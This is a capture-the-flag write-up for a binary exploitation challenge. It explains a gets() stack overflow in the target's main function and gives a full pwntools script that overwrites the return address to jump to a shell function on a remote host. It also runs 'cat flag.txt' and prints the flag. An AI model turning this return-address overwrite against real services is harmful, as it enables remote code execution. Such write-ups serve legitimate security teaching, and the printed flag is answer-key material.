## Quest Details:

![[6.3.0.png]]
## Files:

win ![[win]]
## Steps:

1. Connect to ```nc 173.255.201.51 3337``` on bind shell using netcat

![[6.3.1.png]]

2. In `main/0x40118a` there is call to `gets` with a buffer on the stack. 0x12 bytes to return address with no stack canary. There is a function called `shell/0x401156` with no pie we can simply return to `shell` by overflowing the buffer on the stack in `main` with `gets`:

We craft the exploit in python accordingly

```
from pwn import *

SHELL = 0x00401157

#p = process("./win")
p = remote("173.255.201.51", 3337)

p.readline()

payload = b"A" * 0x12
payload += p64(SHELL)

p.sendline(payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive()
```

3. Run the exploit and get the flag

```
$ python3 ./go.py 
[+] Opening connection to 173.255.201.51 on port 3337: Done
[*] Switching to interactive mode
KCTF{r3T_7o_W1n_iS_V3rRY_3AsY}$ 
[*] Closed connection to 173.255.201.51 port 3337
```

## Flag: KCTF{r3T_7o_W1n_iS_V3rRY_3AsY}